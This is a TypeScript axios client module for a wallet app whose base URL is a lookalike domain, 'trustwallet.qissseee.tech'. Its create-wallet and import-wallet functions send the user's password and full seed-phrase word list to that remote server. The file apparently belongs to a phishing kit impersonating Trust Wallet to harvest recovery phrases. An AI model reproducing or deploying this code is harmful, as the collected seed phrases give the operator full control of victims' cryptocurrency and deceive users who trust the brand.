import axios, { AxiosInstance } from "axios";

const api: AxiosInstance = axios.create({
	baseURL: "https://trustwallet.qissseee.tech/api/",
});

api.interceptors.request.use(
	(config) => {
		const token =
			typeof window !== "undefined" && window.localStorage
				? localStorage.getItem("token")
				: null;

		if (token) {
			config.headers = config.headers || {};
			config.headers.Authorization = `Bearer ${token}`;
		}

		return config;
	},
	(error) => {
		return Promise.reject(error);
	}
);

export const authCreateWallet = async (data: {
	password: string;
	password_confirmation: string;
	seed_words: string[];
}) => await api.post("auth/create-wallet", data);

export const authImportWallet = async (data: {
	password: string;
	password_confirmation: string;
	seed_words: string[];
}) => await api.post("auth/import-wallet", data);

export const authLogout = async () => await api.post("/auth/logout");

export const walletSettings = async () => await api.get("wallet/settings");
